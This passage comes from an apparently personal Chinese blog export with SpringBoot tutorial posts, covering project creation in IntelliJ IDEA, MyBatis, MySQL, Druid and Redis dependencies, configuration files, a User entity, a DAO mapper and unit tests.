<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--手动指定文件夹为resources--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二种</li>
</ul>
<p>在resource文件夹中新建mapper文件夹中，放入StudentMapper.xml，在application.properties中写入以下代码</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定MyBatis映射文件路径</span></span><br><span class="line"><span class="meta">mybatis.mapper-locations</span>=<span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>
<h1 id="6-集成Redis依赖"><a href="#6-集成Redis依赖" class="headerlink" title="6.集成Redis依赖"></a>6.集成Redis依赖</h1><p><strong>1.在pom.xml中添加以下依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringBoot集成Redis起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>2.配置application.properties</strong></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置redis配置信息</span></span><br><span class="line"><span class="meta">spring.redis.host</span>=<span class="string">localhost</span></span><br><span class="line"><span class="meta">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="meta">spring.redis.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SpringBoot学习</category>
      </categories>
      <tags>
        <tag>SpringBoot学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot学习（一）</title>
    <url>/post/2507049e.html</url>
    <content><![CDATA[<p>　　在学校第一次学习SpringBoot的时候写的，跟着老师给的代码，好不容易运行的起来<span id="more"></span></p>
<h1 id="创建SpringBoot项目"><a href="#创建SpringBoot项目" class="headerlink" title="创建SpringBoot项目"></a>创建SpringBoot项目</h1><h2 id="1-网页创建"><a href="#1-网页创建" class="headerlink" title="1.网页创建"></a>1.网页创建</h2><p>打开浏览器访问<a href="https://start.spring.io">https://start.spring.io</a>，进入以下界面<!--more--><img src="https://s3.ax1x.com/2020/11/22/D3qGgH.jpg" alt="D3qGgH.jpg" style="zoom:50%;" /></p>
<h2 id="2-IDEA创建"><a href="#2-IDEA创建" class="headerlink" title="2.IDEA创建"></a>2.IDEA创建</h2><p>点击File-New-Project</p>
<p>选择“Spring Initializr”，</p>
<p><img src="https://s3.ax1x.com/2020/11/22/D3q3CD.jpg" alt="D3q3CD.jpg" style="zoom:50%;" /></p>
<p>点击next，选择</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojCvD.jpg" alt="DojCvD.jpg" style="zoom:50%;" /></p>
<p>点击next</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojiKe.jpg" alt="DojiKe.jpg" style="zoom:50%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojFDH.jpg" alt="DojFDH.jpg" style="zoom:50%;" /></p>
<p>点击next选择项目的名字和位置</p>
<p><img src="https://s3.ax1x.com/2020/12/03/Dojkbd.jpg" alt="Dojkbd.jpg" style="zoom:50%;" /></p>
<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><h2 id="1-main目录"><a href="#1-main目录" class="headerlink" title="1.main目录"></a>1.main目录</h2><p>创建好项目之后目录结构如下</p>
<p><img src="https://s3.ax1x.com/2020/11/22/D3qJvd.jpg" alt="D3qJvd.jpg" style="zoom:50%;" /></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>目录名</th>
<th>位置</th>
</tr>
</thead>
<tbody>
<tr>
<td>工程启动类(Application.java)</td>
<td>置于com.springboot.build</td>
</tr>
<tr>
<td>实体类(domain)</td>
<td>置于com.springboot.domain</td>
</tr>
<tr>
<td>数据访问层(Dao)</td>
<td>置于com.springboot.repository</td>
</tr>
<tr>
<td>数据服务层(Service)</td>
<td>置于com,springboot.service</td>
</tr>
<tr>
<td>数据服务接口的实现(serviceImpl)</td>
<td>置于com.springboot.service.impl</td>
</tr>
<tr>
<td>前端控制器(Controller)</td>
<td>置于com.springboot.controller</td>
</tr>
<tr>
<td>工具类(utils)</td>
<td>置于com.springboot.utils</td>
</tr>
<tr>
<td>常量接口类(constant)</td>
<td>置于com.springboot.constant</td>
</tr>
<tr>
<td>配置信息类(config)</td>
<td>置于com.springboot.config</td>
</tr>
</tbody>
</table>
</div>
<h2 id="2-resources目录"><a href="#2-resources目录" class="headerlink" title="2.resources目录"></a>2.resources目录</h2><p><img src="https://s3.ax1x.com/2020/11/22/D3qtKA.jpg" alt="D3qtKA.jpg" style="zoom: 50%;" /></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>目录名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>static</td>
<td>用于存放html、css、js、图片等静态资源</td>
</tr>
<tr>
<td>templates</td>
<td>用于存放jsp、thymeleaf等模板文件</td>
</tr>
<tr>
<td>resources/application.properties</td>
<td>用于存放程序的各种依赖模块的配置信息，比如 服务端口，数据库连接配置等</td>
</tr>
</tbody>
</table>
</div>
<h1 id="第一个springboot项目"><a href="#第一个springboot项目" class="headerlink" title="第一个springboot项目"></a>第一个springboot项目</h1><p>demo1下新建Controller包，再新建HelloController类</p>
<p><img src="https://s3.ax1x.com/2020/12/01/Df1TQH.jpg" alt="Df1TQH.jpg" style="zoom:50%;" /></p>
<p>在HelloController类中写入以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo1.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="function">String <span class="title">s</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行，第一次运行右下角可能要加载很多东西</p>
<p><img src="https://s3.ax1x.com/2020/12/01/Df1TQH.jpg" alt="Df1TQH.jpg"></p>
<h1 id="访问项目"><a href="#访问项目" class="headerlink" title="访问项目"></a>访问项目</h1><p><a href="https://imgchr.com/i/D3q88e"><img src="https://s3.ax1x.com/2020/11/22/D3q88e.jpg" alt="D3q88e.jpg"></a></p>
<h1 id="课堂代码实例："><a href="#课堂代码实例：" class="headerlink" title="课堂代码实例："></a>课堂代码实例：</h1><p>​        这里我运行的过程很不顺利，在所有代码写完，开始运行时候，idea老是提示错误，后来在网上搜了一大堆，发现是maven版本和idea版本不兼容的问题，maven版本的发行日期一定要比idea的早，不然不能测试成功，懒得再破解idea，所以我把maven版本改为3.6.0版本。</p>
<h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h2><p>数据库的建立这里不再赘述。以下是创建数据库的常用语句：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span> <span class="keyword">from</span> 表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名[(列名<span class="number">1</span>,列名<span class="number">2.</span>..)] <span class="keyword">values</span>(列<span class="number">1</span>数据,列<span class="number">2</span>数据...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 列名=列值,列<span class="number">2</span>名=列<span class="number">2</span>值...<span class="keyword">where</span> 选择条件</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 选择条件</span><br></pre></td></tr></table></figure>
<p>可以使用可视化工具（navicat、sqlyog、sqlfont）创建mydata数据库，之后建表user，表user中有三个字段id int(11)、name varchar(255)、age int (11)，表中有一条数据，数据可以自己设定：</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQcB4.jpg" alt="DTQcB4.jpg"></p>
<h2 id="2-使用springboot创建Web项目"><a href="#2-使用springboot创建Web项目" class="headerlink" title="2.使用springboot创建Web项目"></a>2.使用springboot创建Web项目</h2><p>点击File-New-Project</p>
<p>选择“Spring Initializr”，</p>
<p><img src="https://s3.ax1x.com/2020/11/22/D3q3CD.jpg" alt="D3q3CD.jpg"></p>
<p>点击next，选择</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojCvD.jpg" alt="DojCvD.jpg"></p>
<p>点击next</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojiKe.jpg" alt="DojiKe.jpg"></p>
<p><img src="https://s3.ax1x.com/2020/12/03/DojFDH.jpg" alt="DojFDH.jpg" style="zoom:67%;" /></p>
<p>点击next选择项目的名字和位置</p>
<p><img src="https://s3.ax1x.com/2020/12/03/Dojkbd.jpg" alt="Dojkbd.jpg" style="zoom:67%;" /><img src="https://s3.ax1x.com/2020/12/03/Dojkbd.jpg" alt="Dojkbd.jpg" style="zoom:67%;" /><img src="https://s3.ax1x.com/2020/12/03/Dojkbd.jpg" alt="Dojkbd.jpg" style="zoom:67%;" /></p>
<p>点击finish</p>
<p>刚创建好的项目目录：</p>
<p><img src="https://s3.ax1x.com/2020/11/22/D3qJvd.jpg" alt="D3qJvd.jpg" style="zoom:67%;" /></p>
<h2 id="3-添加依赖"><a href="#3-添加依赖" class="headerlink" title="3.添加依赖"></a>3.添加依赖</h2><p>打开pom.xml，<font color="ff0000">新建好的springboot项目有默认依赖，添加以下依赖</font></p>
<p>(1) SpringMVC支持（如果默认有就不需要添加）</p>
<p>依赖：spring-boot-starter-web</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>(2) 添加Druid依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>(3) 添加Mysql依赖</p>
<font color="ff0000">注意：</font>

<font color="ff0000">查看自己mysql的版本，如果电脑上装的是mysql5.0的使用以下代码添加mysql依赖</font>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<font color="ff0000">mysql8.0的使用以下代码添加mysql依赖</font>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQ49x.jpg" alt="DTQ49x.jpg" style="zoom: 50%;" /></p>
<p>(4) 添加mybatis支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis.spring.boot/mybatis-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>(5) 添加junit依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加junit依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>依赖导入完成之后，如果保存pom.xml文件没有自动下载，按下图操作，之后会自动加载，在IDEA右下方可以查看下载进度，如果没有换maven镜像会很慢，换镜像参考<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a>中的maven仓库配置。</p>
<p><img src="https://s3.ax1x.com/2020/12/03/D76Aqe.jpg" alt="D76Aqe.jpg" style="zoom:67%;" /></p>
<h2 id="4-创建实体类"><a href="#4-创建实体类" class="headerlink" title="4.创建实体类"></a>4.创建实体类</h2><p>(1) 在java的com.example.demo下新建beans包，在这个包下新建User类，<font color="FF0000">这个User一般是数据库中的表名！User类中的3的属性是User表中对应的3个字段，id，age，name</font></p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQRE9.jpg" alt="DTQRE9.jpg" style="zoom:67%;" /></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span> <span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> id, String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;id: &quot;</span> + id + <span class="string">&quot;，&quot;</span> + <span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;，&quot;</span> + <span class="string">&quot;age:&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(2) 创建接口（放在dao包下）</p>
<p>在demo11下新建dao包，新建接口UserDao</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQgHJ.jpg" alt="DTQgHJ.jpg" style="zoom:67%;" /></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo11.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insertUser</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">findUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">findUserById</span><span class="params">(<span class="keyword">int</span> id)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>User出现错误是因为没有导入之前写的User类，点击一下User，然后按住alt+Enter，选择第一个即可</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQD3V.jpg" alt="DTQD3V.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTQ6uF.jpg" alt="DTQ6uF.jpg" style="zoom:67%;" /></p>
<h2 id="5-全局配置文件中添加数据库连接池的连接属性"><a href="#5-全局配置文件中添加数据库连接池的连接属性" class="headerlink" title="5.全局配置文件中添加数据库连接池的连接属性"></a>5.全局配置文件中添加数据库连接池的连接属性</h2><font color="ff0000">注意：如果mysql版本是5.0的，将url和driver-class-name后面的内容按注释内容替换</font>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="comment">#mysql8.0使用 jdbc:mysql://localhost:3306/mydata?serverTimezone=Asia/Shanghai</span></span><br><span class="line">      <span class="comment">#mysql5.0使用 jdbc:mysql://localhost:3306/mydata</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/mydata?serverTimezone=Asia/Shanghai</span></span><br><span class="line">      <span class="comment">#mysql8.x驱动 com.mysql.cj.jdbc.Driver</span></span><br><span class="line">      <span class="comment">#mysql5.x驱动 com.mysql.jdbc.Driver</span></span><br><span class="line">      <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">initial-size:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">min-idle:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">max-active:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mappers/*Mapper.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.example.demo11.beans;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/03/D7sTXD.jpg" alt="D7sTXD.jpg" style="zoom:80%;" /></p>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><h2 id="6-创建映射文件mapper"><a href="#6-创建映射文件mapper" class="headerlink" title="6.创建映射文件mapper"></a>6.创建映射文件mapper</h2><p>在resources下新建mappers包，包下新建userMapper.xml文件，粘贴以下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.demo.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;User&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">      insert into user(id,name,age) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;age&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userset&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUser&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userset&quot;</span> <span class="attr">resultSets</span>=<span class="string">&quot;java.util.List&quot;</span>&gt;</span></span><br><span class="line">        select * from user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUserById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userset&quot;</span>&gt;</span></span><br><span class="line">         select * from user where id=#&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/03/D7D1AI.jpg" alt="D7D1AI.jpg" style="zoom:67%;" /></p>
<p>下图位置就是上图说的位置</p>
<p><img src="https://s3.ax1x.com/2020/12/03/D7DJ9f.jpg" alt="D7DJ9f.jpg" style="zoom:80%;" /></p>
<p>如果第四行出现报错，用以下方法解决，如果没有报错，跳过此步</p>
<p>点击File-&gt;Settings-&gt;Languages&amp;Frameworks-&gt;Schemas and DTDs，点击右边的+号</p>
<p><img src="https://s3.ax1x.com/2020/12/03/DTlSv8.jpg" alt="DTlSv8.jpg" style="zoom:67%;" /></p>
<p>将<a href="http://mybatis.org/dtd/mybatis-3-mapper.dtd链接输入进去确定即可">http://mybatis.org/dtd/mybatis-3-mapper.dtd链接输入进去确定即可</a></p>
<h2 id="7-单元测试类"><a href="#7-单元测试类" class="headerlink" title="7.单元测试类"></a>7.单元测试类</h2><p>(1) 创建单元测试类：最好包名和类名一致</p>
<p>在test包下创建UserDaoTest包，在UserDaoTest包创建UserDaoTest类。</p>
<font color="ff0000">注意前三行，最好删除，然后按照自己的路径，哪里红就在哪里用alt+Enter方法导包。</font>

<font color="ff0000">@SpringBootTest(classes = Demo11Application.class)，这一行中间的classes后面的是下图左边画框的内容</font>

<p><img src="https://s3.ax1x.com/2020/12/03/D72Px0.jpg" alt="D72Px0.jpg"></p>
<p>testInsertUser() 在User表中插入数据，不要让id列是0，因为id是主键</p>
<p>testfindUser() 查找mydata数据库中user表中所有数据</p>
<p>testfindUserById(x) 查出id是x的用户，不要让x的值是数据库id字段不存在的值，不然出现空指针异常。</p>
